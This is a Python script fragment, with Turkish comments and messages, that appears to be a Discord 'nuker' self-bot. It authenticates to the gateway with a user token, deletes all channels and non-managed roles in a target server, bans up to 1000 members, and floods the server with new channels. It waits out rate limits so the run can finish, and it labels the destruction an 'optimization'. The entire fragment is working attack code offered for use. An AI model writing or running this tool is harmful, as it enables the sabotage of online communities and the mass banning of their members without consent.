# İstatistik Sayaçları
silinen_kanal = 0
silinen_rol = 0
banlanan_uye = 0
heartbeat_interval = 40000

def send_heartbeat(ws):
    while True:
        time.sleep(heartbeat_interval / 1000.0)
        try:
            ws.send(json.dumps({"op": 1, "d": None}))
        except:
            break

def start_operation():
    global silinen_kanal, silinen_rol, banlanan_uye
    print(f"\n{Fore.RED}[!] Sıralı optimizasyon süreci başlıyor...\n")

    # --- AŞAMA 1: KANALLARIN SİLİNMESİ ---
    print(Fore.YELLOW + "➔ Aşama 1: Kanallar temizleniyor...")
    channels_res = requests.get(f'https://discord.com/api/v9/guilds/{target_guild_id}/channels', headers=headers)
    if channels_res.status_code == 200:
        for ch in channels_res.json():
            ch_id = ch.get("id")
            ch_name = ch.get("name")
            del_res = requests.delete(f'https://discord.com/api/v9/channels/{ch_id}', headers=headers)
            if del_res.status_code in [200, 204]:
                silinen_kanal += 1
                print(Fore.RED + f"[-] Kanal Silindi: {ch_name}")
            elif del_res.status_code == 429:
                retry_after = del_res.json().get("retry_after", 5)
                print(Fore.MAGENTA + f"[UYARI] Rate Limit! {retry_after} saniye bekleniyor...")
                time.sleep(retry_after)
            time.sleep(kanal_gecikme)

    # --- AŞAMA 2: ROLLERİN SİLİNMESİ ---
    print(Fore.YELLOW + "\n➔ Aşama 2: Roller temizleniyor...")
    roles_res = requests.get(f'https://discord.com/api/v9/guilds/{target_guild_id}/roles', headers=headers)
    if roles_res.status_code == 200:
        for role in roles_res.json():
            r_id = role.get("id")
            r_name = role.get("name")
            if r_name != "@everyone" and not role.get("managed", False):
                del_res = requests.delete(f'https://discord.com/api/v9/guilds/{target_guild_id}/roles/{r_id}', headers=headers)
                if del_res.status_code in [200, 204]:
                    silinen_rol += 1
                    print(Fore.RED + f"[-] Rol Silindi: {r_name}")
                elif del_res.status_code == 429:
                    retry_after = del_res.json().get("retry_after", 5)
                    print(Fore.MAGENTA + f"[UYARI] Rate Limit! {retry_after} saniye bekleniyor...")
                    time.sleep(retry_after)
                time.sleep(rol_gecikme)

    # --- AŞAMA 3: ÜYELERİN BANLANMASI ---
    print(Fore.YELLOW + "\n➔ Aşama 3: Üyeler yasaklanıyor...")
    # Not: Self-botlarda üye listesi çekimi sınırlı olabildiği için api üzerinden erişilebilen mevcut üyeler işlenir
    members_res = requests.get(f'https://discord.com/api/v9/guilds/{target_guild_id}/members?limit=1000', headers=headers)
    if members_res.status_code == 200:
        for member in members_res.json():
            user = member.get("user", {})
            u_id = user.get("id")
            u_name = user.get("username")
            if u_id:
                ban_res = requests.put(f'https://discord.com/api/v9/guilds/{target_guild_id}/bans/{u_id}', headers=headers, json={"delete_message_days": "0", "reason": "Empire System Clean"})
                if ban_res.status_code in [200, 201, 204]:
                    banlanan_uye += 1
                    print(Fore.GREEN + f"[+] Yasaklandı: {u_name}")
                elif ban_res.status_code == 429:
                    retry_after = ban_res.json().get("retry_after", 5)
                    print(Fore.MAGENTA + f"[UYARI] Rate Limit! {retry_after} saniye bekleniyor...")
                    time.sleep(retry_after)
                time.sleep(uye_gecikme)

    # --- AŞAMA 4: YENİ KANALLARIN OLUŞTURULMASI ---
    print(Fore.YELLOW + "\n➔ Aşama 4: Yeni kanallar oluşturuluyor...")
    for i in range(kac_kanal_acilsin):
        payload = {"name": yeni_kanal_ismi, "type": 0}
        create_res = requests.post(f'https://discord.com/api/v9/guilds/{target_guild_id}/channels', headers=headers, json=payload)
        if create_res.status_code in [200, 201]:
            print(Fore.GREEN + f"[+] Kanal Oluşturuldu ({i+1}/{kac_kanal_acilsin}): {yeni_kanal_ismi}")
        elif create_res.status_code == 429:
            retry_after = create_res.json().get("retry_after", 5)
            print(Fore.MAGENTA + f"[UYARI] Rate Limit! {retry_after} saniye bekleniyor...")
            time.sleep(retry_after)
        time.sleep(1.0)

    print(f"\n{Fore.GREEN}=============================================")
    print(Fore.GREEN + "[*] TÜM OPERASYON BAŞARIYLA TAMAMLANDI!")
    print(f"{Fore.GREEN}İstatistikler -> Silinen Kanal: {silinen_kanal} | Rol: {silinen_rol} | Ban: {banlanan_uye}")
    print(f"{Fore.GREEN}=============================================")

def on_message(ws, message):
    global heartbeat_interval
    data = json.loads(message)
    op = data.get("op")
    d = data.get("d")
    
    if op == 10:  # HELLO Sinyali
        heartbeat_interval = d.get("heartbeat_interval", 40000)
        threading.Thread(target=send_heartbeat, args=(ws,), daemon=True).start()
        
        auth_data = {
            "op": 2,
            "d": {
                "token": token,
                "intents": 32767,
                "properties": {
                    "$os": "linux",
                    "$browser": "chrome",
                    "$device": "pc"
                }
            }
        }
        ws.send(json.dumps(auth_data))
        
        # Giriş başarılı olduktan sonra operasyonu ayrı bir iş parçacığında başlat
        threading.Thread(target=start_operation, daemon=True).start()
        return

def on_error(ws, error):
    pass

def on_close(ws, close_status_code, close_msg):
    pass

def connect_gateway():
    ws = websocket.WebSocketApp(
        "wss://gateway.discord.gg/?v=9&encoding=json",
        on_message=on_message,
        on_error=on_error,
        on_close=on_close
    )
    ws.run_forever()

